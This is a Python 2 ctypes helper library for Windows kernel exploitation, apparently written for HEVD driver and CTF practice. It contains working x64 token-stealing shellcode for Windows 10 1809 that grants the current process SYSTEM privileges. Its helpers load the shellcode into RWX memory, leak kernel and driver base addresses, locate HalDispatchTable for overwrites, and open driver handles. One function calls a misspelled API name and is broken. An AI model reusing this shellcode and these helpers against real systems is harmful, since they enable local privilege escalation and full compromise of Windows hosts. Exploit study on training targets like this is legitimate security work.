from ctypes import *
from ctypes.wintypes import *
import struct

# References:
# https://github.com/hugsy/hevd/commit/3dfba966ab7f0ac519e33c7f5c3e8eea91f5d91a
# https://github.com/acru3l/HEVD-exploits

VirtualAlloc = windll.kernel32.VirtualAlloc
CreateFileA = windll.kernel32.CreateFileA
CreateToolhelp32Snapshot = windll.kernel32.CreateToolhelp32Snapshot
Process32First = windll.kernel32.Process32First
Process32Next = windll.kernel32.Process32Next
CloseHandle = windll.kernel32.CloseHandle
GetSystemInfo = windll.kernel32.GetSystemInfo
OpenProcess = windll.kernel32.OpenProcess
CreateProcessA = windll.kernel32.CreateProcessA
DebugBreak = windll.kernel32.DebugBreak
DeviceIoControl = windll.kernel32.DeviceIoControl
NtAllocateVirtualMemory = windll.ntdll.NtAllocateVirtualMemory
NtQuerySystemInformation = windll.ntdll.NtQuerySystemInformation
LoadLibraryA = windll.kernel32.LoadLibraryA
GetProcAddress = windll.kernel32.GetProcAddress


p8 = lambda x : struct.pack("B", x)
p16 = lambda x : struct.pack("H", x)
p32 = lambda x : struct.pack("I", x)
p64 = lambda x : struct.pack("Q", x)

up8 = lambda x : struct.unpack("B", x)[0]
up16 = lambda x : struct.unpack("H", x)[0]
up32 = lambda x : struct.unpack("I", x)[0]
up64 = lambda x : struct.unpack("Q", x)[0]

NULL = 0

INVALID_HANDLE_VALUE = -1
TH32CS_SNAPPROCESS = 0x00000002

GENERIC_READ = 0x80000000
GENERIC_WRITE = 0x40000000

FILE_SHARE_READ = 0x00000001
FILE_SHARE_WRITE = 0x00000002

OPEN_EXISTING = 4

FILE_ATTRIBUTE_NORMAL = 0x00000080
FILE_FLAG_OVERLAPPED = 0x40000000

MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000

PAGE_NOACCESS = 0x01
PAGE_READONLY = 0x02
PAGE_READWRITE = 0x04
PAGE_EXECUTE = 0x10
PAGE_EXECUTE_READ = 0x20
PAGE_EXECUTE_READWRITE = 0x40

PROCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0xFFF)


# https://blahcat.github.io/2017/08/14/a-primer-to-windows-x64-shellcoding/
# very little change for Windows 10 1809 version
def pusha():
    '''
    alernative to pusha on x86
    '''
    # assembled with metasm
    code = ''
    code += '\x50'                                      # push rax
    code += '\x53'                                      # push rbx
    code += '\x51'                                      # push rcx
    code += '\x52'                                      # push rdx
    code += '\x57'                                      # push rdi
    code += '\x56'                                      # push rsi
    code += '\x55'                                      # push rbp
    code += '\x41\x50'                                  # push r8
    code += '\x41\x51'                                  # push r9
    code += '\x41\x52'                                  # push r10
    code += '\x41\x53'                                  # push r11
    code += '\x41\x54'                                  # push r12
    code += '\x41\x55'                                  # push r13
    code += '\x41\x56'                                  # push r14
    code += '\x41\x57'                                  # push r15
    
    return code
    
def popa():
    '''
    alternative to popa on x86
    '''
    # assembled with metasm
    code = ''
    code += '\x41\x5f'                                  # pop r15
    code += '\x41\x5e'                                  # pop r14
    code += '\x41\x5d'                                  # pop r13
    code += '\x41\x5c'                                  # pop r12
    code += '\x41\x5b'                                  # pop r11
    code += '\x41\x5a'                                  # pop r10
    code += '\x41\x59'                                  # pop r9
    code += '\x41\x58'                                  # pop r8
    code += '\x5d'                                      # pop rbp
    code += '\x5e'                                      # pop rsi
    code += '\x5f'                                      # pop rdi
    code += '\x5a'                                      # pop rdx
    code += '\x59'                                      # pop rcx
    code += '\x5b'                                      # pop rbx
    code += '\x58'                                      # pop rax
    
    return code

tokenStealingShellcodeForWin10_1809 = ""
tokenStealingShellcodeForWin10_1809 += pusha()
tokenStealingShellcodeForWin10_1809 += "\x65\x48\x8b\x04\x25\x88\x01\x00\x00"    # mov rax, QWORD PTR gs:0x188
tokenStealingShellcodeForWin10_1809 += "\x48\x8b\x80\xb8\x00\x00\x00"            # mov rax, QWORD PTR [rax+0xb8]
tokenStealingShellcodeForWin10_1809 += "\x48\x89\xc3"                            # mov rbx, rax
# __loop:
tokenStealingShellcodeForWin10_1809 += "\x48\x8b\x9b\xf0\x02\x00\x00"            # mov rbx, QWORD PTR [rbx+0x2f0]
tokenStealingShellcodeForWin10_1809 += "\x48\x81\xeb\xe8\x02\x00\x00"            # sub rbx, 0x2e8
tokenStealingShellcodeForWin10_1809 += "\x48\x8b\x8b\xe0\x02\x00\x00"            # mov rcx, QWORD PTR [rbx+0x2e0]
tokenStealingShellcodeForWin10_1809 += "\x48\x83\xf9\x04"                        # cmp rcx, 0x4
tokenStealingShellcodeForWin10_1809 += "\x75\xe5"                                # jne __loop
tokenStealingShellcodeForWin10_1809 += "\x48\x8b\x8b\x58\x03\x00\x00"            # mov rcx, QWORD PTR [rbx+0x358]
tokenStealingShellcodeForWin10_1809 += "\x80\xe1\xf0"                            # and cl, 0xf0
tokenStealingShellcodeForWin10_1809 += "\x48\x89\x88\x58\x03\x00\x00"            # mov QWORD PTR [rax+0x358], rcx
tokenStealingShellcodeForWin10_1809 += popa()
tokenStealingShellcodeForWin10_1809 += "\x48\x31\xc0"                            # xor rax, rax
tokenStealingShellcodeForWin10_1809 += "\xc3"                                    # ret

# SYSTEM_INFO structure
# https://markboy95.blogspot.com/2012/08/pythonctypes-in-win32_13.html
class _Noname1(Structure):
    _fields_ = [("wProcessorArchitecture", c_ushort),
                ("wReserved", c_short)]

class _Noname2(Union):
    _anonymous_ = ("s",)
    _fields_ = [('dwOemId', c_ulong),
                ('s', _Noname1)]

class SYSTEM_INFO(Structure):
    _anonymous_ = ("u",)
    _fields_ = [("u", _Noname2),
                ("dwPageSize", c_ulong),
                ("lpMinimumApplicationAddress", c_void_p),
                ("lpMaximumApplicationAddress", c_void_p),
                ("dwActiveProcessorMask", c_longlong),
                ("dwNumberOfProcessors", c_ulong),
                ("dwProcessorType", c_ulong),
                ("dwAllocationGranularity", c_ulong),
                ("wProcessorLevel", c_ushort),
                ("wProcessorRevision", c_ushort)]

# PROCESSENTRY32 structure
# https://chaosnabilera.me/?p=619
class PROCESSENTRY32(Structure):
    _fields_ = [("dwSize", c_ulong),
                ("cntUsage", c_ulong),
                ("th32ProcessID", c_ulong),
                ("th32DefaultHeapID", c_void_p),
                ("th32ModuleID", c_ulong),
                ("cntThreads", c_ulong),
                ("th32ParentProcessID", c_ulong),
                ("pcPriClassBase", c_ulong),
                ("dwFlags", c_ulong),
                ("szExeFile", c_char * 260)]


# https://github.com/leony/CTF/blob/master/cce2019_babykernel_exploit.py
class SYSTEM_MODULE_INFORMATION(Structure):
    _fields_ = [("Reserved", c_void_p * 3), 
                ("ImageBase", c_void_p),    
                ("ImageSize", c_ulong),
                ("Flags", c_ulong),
                ("LoadOrderIndex", c_ushort),
                ("InitOrderIndex", c_ushort),
                ("LoadCount", c_ushort),
                ("ModuleNameOffset", c_ushort),
                ("FullPathName", c_char * 256)]



def BreakCode():
    '''
    create int3 break in current process
    '''
    __import__("time").sleep(0.5)
    DebugBreak()


def GetPageSize():
    '''
    return PAGE SIZE of system
    '''
    si = SYSTEM_INFO()
    GetSystemInfo(byref(si))
    return si.dwPageSize


def GetProcessIdByName(processName):
    '''
    return PID of given process name
    '''
    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    if hProcessSnap == INVALID_HANDLE_VALUE:
        print "[!] CreateToolhelp32Snapshot Failed..."
        return -1

    pe32 = PROCESSENTRY32()
    pe32.dwSize = sizeof(PROCESSENTRY32)

    if not Process32First(hProcessSnap, byref(pe32)):
        print "[!] Process32First Failed..."
        CloseHandle(hProcessSnap)
        return -1

    dwPid = -1
    while True:
        isMatch = False
        Process32Next(hProcessSnap, byref(pe32))
        hProcess = OpenProcess(PROCESS_ALL_ACCESS, False, pe32.th32ProcessID)
        if not hProcess:
            continue

        isMatch = (processName == pe32.szExeFile)
        CloseHandle(hProcess)

        if isMatch:
            dwPid = pe32.th32ProcessID
            break

    CloseHandle(hProcessSnap)
    return dwPid


def AllocatePageWithShellcode(myShellcode=tokenStealingShellcodeForWin10_1809):
    '''
    copy myShellcode in RWX memory which allocated by VirtualAlloc with page size(default is 4096) 
    '''
    dwSize = GetPageSize()

    lpBuf = VirtualAlloc(NULL, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    if not lpBuf:
        print "[!] VirtualAlloc Failed..."
        return NULL

    memmove(lpBuf, "\x90" * dwSize, dwSize)
    memmove(lpBuf, myShellcode, len(myShellcode))
    memmove(lpBuf + len(myShellcode), "\xcc" * (dwSize-len(myShellcode)), dwSize-len(myShellcode))

    return lpBuf


def GetKernelBase():
    '''
    find base address of the kernel(ntoskrnl.exe) via EnumDeviceDrivers
    '''
    array = c_ulonglong * 0x400
    addr = array()
    
    windll.psapi.EnumDeviceDrivers.argtypes = [POINTER(LPVOID), DWORD, POINTER(DWORD)]
    windll.psapi.EnumDeviceDrivers.restype = BOOL
    
    res = windll.psapi.EnumDeviceDrivers(
            cast(byref(addr), POINTER(LPVOID)),
            sizeof(addr),
            byref(c_ulong(0)))
    if not res:
        return None
    
    # ntoskrnl.exe is the first entry of the result
    return addr[0]

def GetDeviceName(addr):
    '''
    find file name of kernel via GetDeviceDriverBaseNameA
    '''
    buff = create_string_buffer(0x400)
    
    windll.psapi.GetDeviceDriverBaseNameA.argtypes = [LPVOID, LPCSTR, DWORD]
    windll.psapi.GetDeviceDriverBaseNameA.restype = DWORD
    
    res = windll.psapi.GetDeviceDriverBaseNameA(
            addr,
            buff,
            sizeof(buff))
    if res == 0:
        return None
    
    return buff[:res]

def GetDeviceBase(device_name):
    '''
    find base address of the given device_name via EnumDeviceDrivers and GetDeviceName
    '''
    array = c_ulonglong * 0x400
    addr = array()
    
    windll.psapi.EnumDeviceDrivers.argtypes = [POINTER(LPVOID), DWORD, POINTER(DWORD)]
    windll.psapi.EnumDeviceDrivers.restype = BOOL
    
    res = windll.psapi.EnumDeviceDrivers(
            cast(byref(addr), POINTER(LPVOID)),
            sizeof(addr),
            byref(c_ulong(0)))
    if not res:
        return None
    
    retval = NULL
    for a in addr:
        tmp =GetDeviceName(a).lower()
        if (device_name.lower() == tmp) or (device_name.lower() in tmp):
            retval = a
            break

    return retval


def DriverConnect(driver_name):
    '''
    connect to driver_name using CreateFile
    '''
    hDriver = CreateFileA(
		driver_name, 
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
		NULL)
        
    if hDriver == INVALID_HANDLE_VALUE:
        return None
    else:
        return hDriver


# https://github.com/leony/CTF/blob/master/cce2019_babykernel_exploit.py
def GetHDTKernelAddress():   
    b = create_string_buffer(0)
    systeminformationlength = c_ulong(0)
    res = nNtQuerySystemInformation(11, b, len(b), byref(systeminformationlength))
    b = create_string_buffer(systeminformationlength.value)
    res = NtQuerySystemInformation(11, b, len(b), byref(systeminformationlength))
    smi = SYSTEM_MODULE_INFORMATION()
    memmove(addressof(smi), b, sizeof(smi))
    kernelImage = smi.FullPathName.split('\\')[-1]
    hKernelImage = LoadLibraryA(kernelImage)
    HDT_user_address = GetProcAddress(hKernelImage,"HalDispatchTable")
    HDT_kernel_address = smi.ImageBase + ( HDT_user_address - hKernelImage)
    return HDT_kernel_address
    
